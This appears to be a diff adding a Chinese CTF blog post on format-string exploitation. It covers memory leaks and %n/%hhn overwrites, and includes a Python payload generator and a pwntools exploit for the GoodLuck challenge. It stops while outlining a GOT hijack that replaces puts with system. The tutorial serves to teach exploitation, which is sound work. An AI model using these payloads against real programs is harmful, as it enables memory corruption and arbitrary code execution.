@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/TRICK-LOGO.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/TRICK-LOGO.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/TRICK-LOGO.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"trick.ink","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Fmtstr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Fmtstr">
+<meta property="og:url" content="http://trick.ink/2021/03/24/FmtStr/index.html">
+<meta property="og:site_name" content="Trick&#39;s Blog">
+<meta property="og:description" content="Fmtstr">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://trick.ink/2021/03/24/FmtStr/FmtStr/20200323095517-585c876c-6ca9-1.png">
+<meta property="og:image" content="http://trick.ink/2021/03/24/FmtStr/FmtStr/20200323095518-58ad4d5a-6ca9-1.png">
+<meta property="og:image" content="http://trick.ink/2021/03/24/FmtStr/FmtStr/image-20210331181935199.png">
+<meta property="og:image" content="http://trick.ink/2021/03/24/FmtStr/FmtStr/image-20210331182037722.png">
+<meta property="og:image" content="http://trick.ink/2021/03/24/FmtStr/FmtStr/image-20210402145416197.png">
+<meta property="og:image" content="http://trick.ink/2021/03/24/FmtStr/FmtStr/image-20210402155026123.png">
+<meta property="og:image" content="http://trick.ink/2021/03/24/FmtStr/FmtStr/image-20210402155158540.png">
+<meta property="og:image" content="http://trick.ink/2021/03/24/FmtStr/FmtStr/image-20210402155325101.png">
+<meta property="og:image" content="http://trick.ink/2021/03/24/FmtStr/FmtStr/image-20210402160140172.png">
+<meta property="og:image" content="http://trick.ink/2021/03/24/FmtStr/FmtStr/image-20210403174303056.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191440.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/YTrick/image/branch/image/20210306191649.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140046.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/YTrick/image/branch/image/20210307140246.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/YTrick/image/branch/image/20210308133927.png">
+<meta property="article:published_time" content="2021-03-24T12:22:54.088Z">
+<meta property="article:modified_time" content="2021-05-08T10:12:50.698Z">
+<meta property="article:author" content="Trick">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://trick.ink/2021/03/24/FmtStr/FmtStr/20200323095517-585c876c-6ca9-1.png">
+
+<link rel="canonical" href="http://trick.ink/2021/03/24/FmtStr/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Fmtstr | Trick's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Trick's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Trick's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://trick.ink/2021/03/24/FmtStr/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/TRICK-LOGO.gif">
+      <meta itemprop="name" content="Trick">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Trick's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Fmtstr
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-24 20:22:54" itemprop="dateCreated datePublished" datetime="2021-03-24T20:22:54+08:00">2021-03-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-05-08 18:12:50" itemprop="dateModified" datetime="2021-05-08T18:12:50+08:00">2021-05-08</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Fmtstr/" itemprop="url" rel="index"><span itemprop="name">Fmtstr</span></a>
+                </span>
+            </span>
+
+          
+            <span id="/2021/03/24/FmtStr/" class="post-meta-item leancloud_visitors" data-flag-title="Fmtstr" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>12k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>11 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Fmtstr"><a href="#Fmtstr" class="headerlink" title="Fmtstr"></a>Fmtstr</h1><span id="more"></span>
+
+
+
+<p>第三个地址指向的是格式化字符串第一个变量值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(pwnme) + <span class="string">&#x27;aaaa&#x27;</span> + <span class="string">&quot;%10$n&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>p32 = 4字节</p>
+<p>‘aaaa’ = 4字节</p>
+<p>“%10$n” = 修改第10个参数 （通过[tag]%p%p…)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ fmtarg [addr] #计算字符串偏移</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmtstr_payload(offset,&#123;address:value&#125;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>32位：</p>
+<p><img src="FmtStr/20200323095517-585c876c-6ca9-1.png" alt="img"></p>
+<p>64位：</p>
+<p><img src="FmtStr/20200323095518-58ad4d5a-6ca9-1.png" alt="img"></p>
+<p>小技巧总结</p>
+<ol>
+<li>利用 %x 来获取对应栈的内存，但建议使用 %p，可以不用考虑位数的区别。</li>
+<li>利用 %s 来获取变量所对应地址的内容，只不过有零截断。</li>
+<li>利用 %order$x 来获取指定参数的值，利用 %order$s 来获取指定参数对应地址的内容。</li>
+</ol>
+<h2 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h2><blockquote>
+<p>一般来说32位程序 b printf 的栈中<br>第一个变量是返回地址<br>第二个变量是格式化字符串的地址<br>第三个开始为第一个变量的值</p>
+</blockquote>
+<h3 id="泄露栈内存"><a href="#泄露栈内存" class="headerlink" title="泄露栈内存"></a>泄露栈内存</h3><h4 id="获取栈变量数值"><a href="#获取栈变量数值" class="headerlink" title="获取栈变量数值"></a>获取栈变量数值</h4><p>获取栈中被视为第 n+1 个参数的值（第一个是返回地址，所以从n+1开始） : <code>%n$x</code>，或者用%p也可以</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint 1, __printf (format&#x3D;0xffffcd10 &quot;%3$x&quot;) at printf.c:28</span><br><span class="line">28  in printf.c</span><br><span class="line">─────────────────────────────────────────────────────[ code:i386 ]────</span><br><span class="line">   0xf7e44667 &lt;fprintf+23&gt;     inc    DWORD PTR [ebx+0x66c31cc4]</span><br><span class="line">   0xf7e4466d                  nop</span><br><span class="line">   0xf7e4466e                  xchg   ax, ax</span><br><span class="line"> → 0xf7e44670 &lt;printf+0&gt;       call   0xf7f1ab09 &lt;__x86.get_pc_thunk.ax&gt;</span><br><span class="line">   ↳  0xf7f1ab09 &lt;__x86.get_pc_thunk.ax+0&gt; mov    eax, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab0c &lt;__x86.get_pc_thunk.ax+3&gt; ret</span><br><span class="line">      0xf7f1ab0d &lt;__x86.get_pc_thunk.dx+0&gt; mov    edx, DWORD PTR [esp]</span><br><span class="line">      0xf7f1ab10 &lt;__x86.get_pc_thunk.dx+3&gt; ret</span><br><span class="line">─────────────────────────────────────────────────────[ stack ]────</span><br><span class="line">[&#39;0xffffccfc&#39;, &#39;l8&#39;]</span><br><span class="line">8</span><br><span class="line">0xffffccfc│+0x00: 0x080484ce  →  &lt;main+99&gt; add esp, 0x10     ← $esp 	&#x2F;&#x2F;返回地址</span><br><span class="line">0xffffcd00│+0x04: 0xffffcd10  →  &quot;%3$x&quot; 							&#x2F;&#x2F;1</span><br><span class="line">0xffffcd04│+0x08: 0xffffcd10  →  &quot;%3$x&quot; 							&#x2F;&#x2F;2</span><br><span class="line">0xffffcd08│+0x0c: 0x000000c2    					   				&#x2F;&#x2F;3</span><br><span class="line">0xffffcd0c│+0x10: 0xf7e8b6bb  →  &lt;handle_intel+107&gt; add esp, 0x10 		&#x2F;&#x2F;4</span><br><span class="line">0xffffcd10│+0x14: &quot;%3$x&quot;     ← $eax</span><br><span class="line">0xffffcd14│+0x18: 0xffffce00  →  0x00000001</span><br><span class="line">0xffffcd18│+0x1c: 0x000000e0</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">f7e8b6bb[Inferior 1 (process 57442) exited normally]</span><br></pre></td></tr></table></figure>
+
+<p>这里输入%3$x，获得了printf的第四个参数所对应的值 f7e8b6bb</p>
+<h4 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用到 %s</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[tag]%p%p%p%p%p%p...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fmtarg 0xffffcefc</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%n,不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h3><p>让c=16</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(c_addr) + <span class="string">&#x27;%012d&#x27;</span> + <span class="string">&#x27;%6$n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>‘%012d’ = 12个字符<br>‘%6$n’ = 占4个字符。用payload的字符个数更改第6个参数的值</p>
+<h3 id="覆盖任意地址内存"><a href="#覆盖任意地址内存" class="headerlink" title="覆盖任意地址内存"></a>覆盖任意地址内存</h3><h4 id="覆盖小数字（没理解）"><a href="#覆盖小数字（没理解）" class="headerlink" title="覆盖小数字（没理解）"></a>覆盖小数字（没理解）</h4><p>我们的格式化字符串的为第 6 个参数。<br>想要把 2 写到对应的地址处，故而格式化字符串的前面的字节必须是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa%k$nxx</span><br></pre></td></tr></table></figure>
+
+<p>此时对应的存储的格式化字符串已经占据了 6 个字符的位置，如果我们再添加两个字符 aa，那么其实 aa%k 就是第 6 个参数，$nxx 其实就是第 7 个参数，后面我们如果跟上我们要覆盖的地址，那就是第 8 个参数，所以如果我们这里设置 k 为 8，其实就可以覆盖了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;aa%8$naa&#x27;</span> + p32(a_addr)</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h4><p>0x12345678 在内存中由低地址到高地址依次为 \ x78\x56\x34\x12。再者，我们可以回忆一下格式化字符串里面的标志，可以发现有这么两个标志：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数。</span><br><span class="line">h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%hhn 向某个地址写入单字节</span><br><span class="line">%hn 向某个地址写入双字节</span><br></pre></td></tr></table></figure>
+
+<p>希望覆盖的地址为 0x0804A028。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:0804A028                 public b</span><br><span class="line">.data:0804A028 b               dd 1C8h                 ; DATA XREF: main:loc_8048510r</span><br></pre></td></tr></table></figure>
+
+<p>即我们希望将按照如下方式进行覆盖，前面为覆盖地址，后面为覆盖内容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x0804A028 \x78</span><br><span class="line">0x0804A029 \x56</span><br><span class="line">0x0804A02a \x34</span><br><span class="line">0x0804A02b \x12</span><br></pre></td></tr></table></figure>
+
+<p>首先，由于我们的字符串的偏移为 6，所以我们可以确定我们的 payload 基本是这个样子的</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(0x0804A028)+p32(0x0804A029)+p32(0x0804A02a)+p32(0x0804A02b)+pad1+&#39;%6$n&#39;+pad2+&#39;%7$n&#39;+pad3+&#39;%8$n&#39;+pad4+&#39;%9$n&#39;</span><br></pre></td></tr></table></figure>
+
+<h5 id="payload生成器"><a href="#payload生成器" class="headerlink" title="payload生成器"></a>payload生成器</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt</span>(<span class="params">prev, word, index</span>):</span></span><br><span class="line">    <span class="keyword">if</span> prev &lt; word:</span><br><span class="line">        result = word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> prev == word:</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="number">256</span> + word - prev</span><br><span class="line">        fmtstr = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(result) + <span class="string">&quot;c&quot;</span></span><br><span class="line">    fmtstr += <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(index) + <span class="string">&quot;$hhn&quot;</span></span><br><span class="line">    <span class="keyword">return</span> fmtstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fmt_str</span>(<span class="params">offset, size, addr, target</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        <span class="keyword">if</span> size == <span class="number">4</span>:</span><br><span class="line">            payload += p32(addr + i)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            payload += p64(addr + i)</span><br><span class="line">    prev = <span class="built_in">len</span>(payload)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        payload += fmt(prev, (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span>, offset + i)</span><br><span class="line">        prev = (target &gt;&gt; i * <span class="number">8</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line">payload = fmt_str(<span class="number">6</span>,<span class="number">4</span>,<span class="number">0x0804A028</span>,<span class="number">0x12345678</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>offset 表示要覆盖的地址最初的偏移</li>
+<li>size 表示机器字长</li>
+<li>addr 表示将要覆盖的地址。</li>
+<li>target 表示我们要覆盖为的目的变量值。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = fmt_str(<span class="number">6</span>, <span class="number">4</span>, <span class="number">0x0804A028</span>, <span class="number">0x12345678</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="x64例题"><a href="#x64例题" class="headerlink" title="x64例题"></a>x64例题</h2><h3 id="pwn200-GoodLuck"><a href="#pwn200-GoodLuck" class="headerlink" title="pwn200 GoodLuck"></a><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2017-UIUCTF-pwn200-GoodLuck">pwn200 GoodLuck</a></h3><p>保护</p>
+<p><img src="FmtStr/image-20210331181935199.png" alt="image-20210331181935199"></p>
+<p>IDA</p>
+<p><img src="FmtStr/image-20210331182037722.png" alt="image-20210331182037722"></p>
+<p>格式化字符串漏洞，去gdb调试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7a62807 &lt;__fprintf+135&gt;:	add    rsp,0xd8</span><br><span class="line">   0x7ffff7a6280e &lt;__fprintf+142&gt;:	ret    </span><br><span class="line">   0x7ffff7a6280f:	nop</span><br><span class="line">&#x3D;&gt; 0x7ffff7a62810 &lt;__printf&gt;:	sub    rsp,0xd8</span><br><span class="line">   0x7ffff7a62817 &lt;__printf+7&gt;:	test   al,al</span><br><span class="line">   0x7ffff7a62819 &lt;__printf+9&gt;:	mov    QWORD PTR [rsp+0x28],rsi</span><br><span class="line">   0x7ffff7a6281e &lt;__printf+14&gt;:	mov    QWORD PTR [rsp+0x30],rdx</span><br><span class="line">   0x7ffff7a62823 &lt;__printf+19&gt;:	mov    QWORD PTR [rsp+0x38],rcx</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffde08 --&gt; 0x400890 (&lt;main+234&gt;:	mov    edi,0x4009b8)</span><br><span class="line">0008| 0x7fffffffde10 --&gt; 0x61000001 </span><br><span class="line">0016| 0x7fffffffde18 --&gt; 0x602830 --&gt; 0x61616161 (&#39;aaaa&#39;)</span><br><span class="line">0024| 0x7fffffffde20 --&gt; 0x602010 (&quot;You answered:\ng\n&quot;)</span><br><span class="line">0032| 0x7fffffffde28 --&gt; 0x7fffffffde30 (&quot;flag&#123;&quot;, &#39;1&#39; &lt;repeats 11 times&gt;, &quot;&#125;\n\377\377\377\377&quot;)</span><br><span class="line">0040| 0x7fffffffde30 (&quot;flag&#123;&quot;, &#39;1&#39; &lt;repeats 11 times&gt;, &quot;&#125;\n\377\377\377\377&quot;)</span><br><span class="line">0048| 0x7fffffffde38 (&quot;11111111&#125;\n\377\377\377\377&quot;)</span><br><span class="line">0056| 0x7fffffffde40 --&gt; 0xffffffff0a7d </span><br></pre></td></tr></table></figure>
+
+<p>发现地址0x7fffffffde28，即第四个参数的位置是flag，偏移为 4。此外，由于这是一个 64 位程序，所以前 6 个参数存在在对应的寄存器中，fmt 字符串存储在 RDI 寄存器中，所以 fmt 字符串对应的地址的偏移为 4+6。</p>
+<blockquote>
+<p>fmt 字符串中 <code>%order$s</code> 对应的 order 为 fmt 字符串后面的参数的顺序，所以我们只需要输入 %10-1$s ，即 %9$s 即可得到 flag 的内容。</p>
+</blockquote>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./goodluck&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;%9$s&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;what\&#x27;s the flag&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="hijack-GOT"><a href="#hijack-GOT" class="headerlink" title="hijack GOT"></a>hijack GOT</h2><h3 id="2016-CCTF-pwn3"><a href="#2016-CCTF-pwn3" class="headerlink" title="2016 CCTF_pwn3"></a>2016 CCTF_<a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2016-CCTF-pwn3">pwn3</a></h3><p>保护</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;trick&#x2F;Desktop&#x2F;goodluck&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>格式化字符串漏洞在get函数中</p>
+<p><img src="FmtStr/image-20210402145416197.png" alt="image-20210402145416197"></p>
+<p>基本思路：</p>
+<ul>
+<li>绕过密码</li>
+<li>确定格式化字符串参数偏移</li>
+<li>利用 put@got 获取 put 函数地址，进而获取对应的 libc.so 的版本，进而获取对应 system 函数地址。</li>
+<li>修改 puts@got 的内容为 system 的地址。</li>
+<li>当程序再次执行 puts 函数的时候，其实执行的是 system 函数。</li>
+</ul>
